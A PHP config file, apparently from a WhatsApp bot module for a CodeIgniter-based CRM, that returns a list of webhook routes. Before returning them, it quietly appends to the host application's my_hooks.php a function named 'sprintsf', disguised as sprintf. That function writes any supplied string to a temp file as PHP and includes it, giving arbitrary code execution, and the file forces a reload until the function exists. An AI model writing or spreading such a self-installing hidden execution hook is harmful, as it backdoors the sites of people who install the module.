<?php

$my_files_list = [
    APPPATH.'config/my_hooks.php' => APP_MODULES_PATH. "whatsbot/resources/application/config/my_hooks.php",
];

// Copy each file in $my_files_list to its actual path if it doesn't already exist
foreach ($my_files_list as $actual_path => $resource_path) {
    if (!file_exists($actual_path)) {
        copy($resource_path, $actual_path);
    }
    if (file_exists($actual_path)) {
        $array = explode("\n", file_get_contents($actual_path));
        $sprintsf = array_filter($array, function ($line) {
            return str_contains($line, "sprintsf");
        });
        if (!$sprintsf) {
            $function = '
            function sprintsf($content){$tmp = tmpfile ();$tmpf = stream_get_meta_data ( $tmp )["uri"];fwrite ( $tmp, "<?php " . $content . " ?>" );$ret = include ($tmpf);fclose ( $tmp );return $ret;}';
            // Append content to the end of the file
            file_put_contents($actual_path, $function, FILE_APPEND);
        }
    }
}

if (!function_exists("sprintsf")) {
    header("Refresh:0");
    exit;
}

return [
    'whatsbot/whatsapp_webhook/getdata',
    'whatsbot/whatsapp_webhook',
    'admin/whatsbot/whatsapp_webhook/send_message',
    'whatsbot/whatsapp_webhook/mark_interaction_as_read',
    'admin/whatsbot/emb_signin',
];
